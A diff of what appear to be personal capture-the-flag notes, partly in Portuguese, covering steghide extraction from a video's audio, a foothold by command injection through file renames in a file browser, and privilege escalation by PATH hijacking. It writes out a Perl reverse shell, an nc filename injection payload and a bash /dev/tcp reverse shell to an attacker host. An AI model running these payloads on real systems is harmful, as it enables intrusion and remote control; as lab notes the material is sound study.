@@ -153,6 +153,10 @@ steghide flowers in richman
 
 ## foothold: CVE-2026-35585  no file-browser
 - rename um arquivo pra `; nc <IP> 4444 -e sh #` e dps rename dnv p qqr csa, vai rodar (rode listener antes)
+- rename pra
+```
+perl -e 'use Socket;$i="<ATTACKER_IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
+```
 
 CLUE
 - download rich_man.mkv, extract audio, run steghide w rockyou (supernovaflyingbakekang )
@@ -167,9 +171,25 @@ ffmpeg -i rich_man.mp4 -i audio.wav \
     -c:v copy \
     -c:a pcm_s16le \
     rich_man.mkv
-```
 
 cat whats_happenning.txt >> rich_man.mkv
+```
+by doing
+```
+$ffmpeg -i rich_man.mkv -map 0:a -c copy audio.wav
+$steghide extract -sf audio.wav -p supernovaflyingbakekang
+wrote extracted data to "foothold_b64.txt".
+$cat foothold_b64.txt | base64 -d
+sh -c "echo this old filename has been changed and is now deprecated: \$FILE"
+```
+### Payload
+rename any file with a revshell 
+```
+; nc <ATTACKER_IP> 4444 -e sh #
+```
+then rename it agani to anything.
+
+remember: for this to work, an admin has to have set that `sh ... echo` command after every rename. 
 
 ## PE
 after login as supernova 
@@ -189,7 +209,7 @@ then execute path hijack
 ```
 cd singularity
 echo '#!/bin/bash' > singularity
-echo 'bash -i >& /dev/tcp/192.168.15.14/4444 0>&1' >> singularity
+echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> singularity
 chmod +x singularity
 export PATH=/home/supernova/singularity:$PATH
 echo $PATH
